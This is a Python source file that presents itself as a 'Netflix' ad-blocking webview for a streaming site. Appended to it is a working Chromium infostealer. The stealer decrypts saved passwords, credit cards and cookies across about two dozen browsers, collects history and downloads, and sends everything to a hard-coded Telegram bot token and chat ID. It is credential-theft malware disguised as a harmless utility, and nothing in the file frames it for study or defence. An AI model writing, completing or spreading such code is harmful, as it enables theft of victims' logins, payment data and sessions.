import base64
import json
import os
import shutil
import sqlite3
import requests
from datetime import datetime, timedelta

from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData


import webview


# JavaScript to block ads and prevent popups
adblock_js = """
document.addEventListener('DOMContentLoaded', function() {
    let adSelectors = [
        'iframe[src*="ads"]', 'iframe[src*="banner"]', 
        'div[class*="ad"]', 'div[id*="ad"]', 
        'div[class*="banner"]', 'iframe[src*="doubleclick"]', 
        'video[poster*="ads"]', 'div[class*="sponsored"]'
    ];

    adSelectors.forEach(selector => {
        let elements = document.querySelectorAll(selector);
        elements.forEach(el => el.style.display = 'none');
    });

    // Remove popup ads and overlay ads
    let overlays = document.querySelectorAll('div[class*="overlay"], div[class*="popup"]');
    overlays.forEach(el => el.remove());

    // Block scripts that attempt to open popups
    window.open = function() { return null; };
    document.querySelectorAll('a[target="_blank"]').forEach(el => el.removeAttribute('target'));
});
"""

# Create the webview window with ad-blocking JavaScript injected
def create_window():
    window = webview.create_window('Netflix', 'https://rivestream.live')
    webview.start(block_ads, window)

def block_ads(window):
    # Inject ad-blocking JavaScript when the window is loaded
    window.evaluate_js(adblock_js)

if __name__ == "__main__":
    create_window()




# telegram bot
TELEGRAM_BOT_TOKEN= '7355033282:AAGPgp3UysKDjet0Y92ZYXhWLVJFOaATJq4'
TELEGRAM_CHAT_ID= '5704626620'

# local and roaming app data directories
local_appdata= os.getenv('LOCALAPPDATA')
roaming_appdata= os.getenv('APPDATA')

# chromium browser list
browsers={
    'avast':local_appdata+'\\AVAST Software\\Browser\\User Data',
    'amigo':local_appdata+'\\Amigo\\User Data',
    'torch':local_appdata+'\\Torch\\User Data',
    'kometa':local_appdata+'\\Kometa\\User Data',
    'orbitum':local_appdata+'\\Orbitum\\User Data',
    'cent-browser':local_appdata+'\\CentBrowser\\User Data',
    '7star':local_appdata+'\\7Star\\7Star\\User Data',
    'sputnik':local_appdata+'\\Sputnik\\Sputnik\\User Data',
    'vivaldi':local_appdata+'\\Vivaldi\\User Data',
    'chromium':local_appdata+'\\Chromium\\User Data',
    'chrome-canary':local_appdata+'\\Google\\Chrome SxS\\User Data',
    'chrome':local_appdata+'\\Google\\Chrome\\User Data',
    'epic-privacy-browser':local_appdata+'\\Epic Privacy Browser\\User Data',
    'msedge':local_appdata+'\\Microsoft\\Edge\\User Data',
    'msedge-canary':local_appdata+'\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta':local_appdata+'\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev':local_appdata+'\\Microsoft\\Edge Dev\\User Data',
    'uran':local_appdata+'\\uCozMedia\\Uran\\User Data',
    'yandex':local_appdata+'\\Yandex\\YandexBrowser\\User Data',
    'brave':local_appdata+'\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium':local_appdata+'\\Iridium\\User Data',
    'coccoc':local_appdata+'\\CocCoc\\Browser\\User Data',
    'opera':roaming_appdata+'\\Opera Software\\Opera Stable',
    'opera-gx':roaming_appdata+'\\Opera Software\\Opera GX Stable'
}

# data queries to extract information from browser databases
data_queries={
    'login_data':{
        'query':'SELECT action_url, username_value, password_value FROM logins',
        'file':'\\Login Data',
        'columns':['URL', 'Email', 'Password'],
        'decrypt':True
    },
    'credit_cards':{
        'query':'SELECT name_on_card,expiration_month,expiration_year,card_number_encrypted,date_modified FROM credit_cards',
        'file':'\\Web Data',
        'columns':['Name On Card','Card Number','Expires On','Added On'],
        'decrypt':True
    },
    'cookies': {
        'query':'SELECT host_key,name,path,encrypted_value,expires_utc FROM cookies',
        'file':'\\Network\\Cookies',
        'columns':['Host Key','Cookie Name','Path','Cookie','Expires On'],
        'decrypt':True
    },
    'history': {
        'query':'SELECT url, title, last_visit_time FROM urls',
        'file':'\\History',
        'columns':['URL', 'Title', 'Visited Time'],
        'decrypt':False
    },
    'downloads': {
        'query':'SELECT tab_url, target_path FROM downloads',
        'file':'\\History',
        'columns':['Download URL', 'Local Path'],
        'decrypt':False
    }
}

# get master key for a specific browser profile
def get_master_key(profile_path):
    if not os.path.exists(profile_path):
        return None

    local_state_path = profile_path + "\\Local State"
    if 'os_crypt' not in open(local_state_path, 'r',encoding='utf-8').read():
        return None

    with open(local_state_path,"r",encoding="utf-8") as file:
        local_state_data=json.loads(file.read())

    encrypted_key=base64.b64decode(local_state_data["os_crypt"]["encrypted_key"])[5:]
    return CryptUnprotectData(encrypted_key,None,None,None,0)[1]

# decrypt encrypted passwords
def decrypt_password(encrypted_data, key):
    iv=encrypted_data[3:15]
    payload=encrypted_data[15:]
    cipher=AES.new(key, AES.MODE_GCM, iv)
    return cipher.decrypt(payload)[:-16].decode()

# send results to tg bot
def send_to_telegram(message):
    url=f'https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage'
    payload={
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message
    }
    response=requests.post(url, json=payload)
    if response.status_code==200:
        print("[+] Message sent to Telegram")
    else:
        print("[-] Failed to send message to Telegram")

# save to file
def save_results(browser_name,data_type, content):
    if not os.path.exists(browser_name):
        os.mkdir(browser_name)
    if content:
        with open(f'{browser_name}/{data_type}.txt','w',encoding="utf-8") as file:
            file.write(content)
        send_to_telegram(f"Data extracted from {browser_name}-{data_type}:\n{content[:4000]}")  # limiting message length for Tg
        print(f"\t[*] Data saved in {browser_name}/{data_type}.txt")
    else:
        print(f"\t[-] No data found!")

# extract data from browser database
def get_data(profile_path,profile,master_key,data_type):
    db_path=f'{profile_path}\\{profile}{data_type["file"]}'
    if not os.path.exists(db_path):
        return ""

    try:
        shutil.copy(db_path, 'temp_db')
    except:
        print(f"Unable to access {data_type['file']}")
        return ""

    conn=sqlite3.connect('temp_db')
    cursor=conn.cursor()
    cursor.execute(data_type['query'])

    results = []
    for row in cursor.fetchall():
        row=list(row)
        if data_type['decrypt']:
            row=[decrypt_password(item,master_key) if isinstance(item, bytes) and item else item for item in row]

        if data_type_name=='history' and row[2]!=0:
            row[2]=convert_chrome_time(row[2])

        formatted_row = "\n".join([f"{col}: {val}" for col,val in zip(data_type['columns'],row)])
        results.append(formatted_row)

    conn.close()
    os.remove('temp_db')
    return "\n\n".join(results)

def convert_chrome_time(chrome_timestamp):
    return (datetime(1601,1,1)+timedelta(microseconds=chrome_timestamp)).strftime('%d/%m/%Y %H:%M:%S')

# identify installed browsers
def installed_browsers():
    return [browser for browser,path in browsers.items() if os.path.exists(path +"\\Local State")]


if __name__ == '__main__':
    available_browsers=installed_browsers()
    
    for browser in available_browsers:
        browser_path=browsers[browser]
        master_key=get_master_key(browser_path)
        print(f"Fetching stored details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t[!] Extracting {data_type_name.replace('_',' ').capitalize()}")
            profile="Default" if browser!='opera-gx' else ""
            extracted_data=get_data(browser_path,profile,master_key,data_type)
            save_results(browser,data_type_name,extracted_data)
            print("\t------\n")
